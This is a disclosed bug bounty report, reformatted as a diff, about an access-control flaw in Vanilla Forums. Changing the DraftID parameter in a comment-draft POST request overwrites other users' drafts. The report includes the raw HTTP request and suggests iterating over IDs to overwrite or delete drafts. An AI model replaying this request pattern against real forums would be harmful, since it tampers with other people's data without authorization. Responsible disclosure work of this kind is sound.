@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/258201
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/geekboy
+ReportedTo:Vanilla(vanilla)
+BountyAmount:300.0
+Severity:medium
+State:Closed
+DateOfDisclosure:23.07.2018 14:32:24
+
+Summary:
+
+
+###Description:
+-----------
+Users have option to save drafts before doing comment on posts or discussions, where `DraftID` parameter is get passed to keep the draft record and if attacker replace this id with any existing id it will simple overwrite that record without checking the permission he that user is allowed to access that draft or not.
+
+###Sample Post request:
+````http
+POST /post/comment/?discussionid=17598 HTTP/1.1
+Host: open.vanillaforums.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://open.vanillaforums.com/discussion/17598/have-you-noticed-the-new-like-button-on-vanillaforums-org
+Content-Length: 185
+Cookie: <Redacted>
+DNT: 1
+Connection: close
+
+TransientKey=JnZOUDaSl3N7Qviz&SomeRequiredField=&DiscussionID=17598&CommentID=&DraftID=&Format=Markdown&Body=aasdsa&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Draft&LastCommentID=247998
+```
++ Replace/add value to `DraftID` with any existing values of any user and it will simply overwrite that data.
+
+{F210848}
+
+###Exploitability: 
++ Attacker can iterate through all the ID and overwrite/remove the drafts of other users.
+
+###Possible Fix:
+-----------
++ Check for permission. 
+
+
+Please let me know if any more info needed !
+
+-------------
+
+__*- Geekboy!*__
